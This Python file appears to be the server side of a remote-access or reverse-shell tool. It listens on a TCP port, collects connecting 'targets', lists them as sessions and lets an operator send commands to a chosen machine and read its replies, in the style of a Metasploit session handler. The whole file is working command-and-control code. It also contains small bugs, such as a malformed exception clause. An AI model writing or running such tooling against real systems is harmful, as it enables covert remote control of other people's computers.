import socket
import sys
import threading

def list_targets(targets):
    print((targets[0])[1])

def comm_in(targ_id):
    print('[*] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def comm_handler():
    while True:
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(f'\n[+] Connection recevied from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass

def listener_handler():
    sock.bind((host_ip, host_port))
    print('[*] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def target_comm(targ_id):
    while True:
        message = input('send message#> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                targ_id.close()
                break
            print(response)

if __name__ == '__main__':
    targets = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #host_ip = sys.argv[1] 
        #host_port = int(sys.argv[2])
        host_ip = '127.0.0.1'
        host_port = 2222
        listener_handler()   
    except IndexError:
        print('[-] Command line arguments missing. Please list [Host] and [Port]')
    except Exception() as e:
        print(e)
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1]  == '-l':
                    print('Session' + ' ' * 10 + 'Target')
                    for target in targets:
                        print(str(session_counter) + ' ' * 16 + target[1])
                        session_counter += 1
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[-] Keyboard interrupt issued')
            sock.close()
            break         
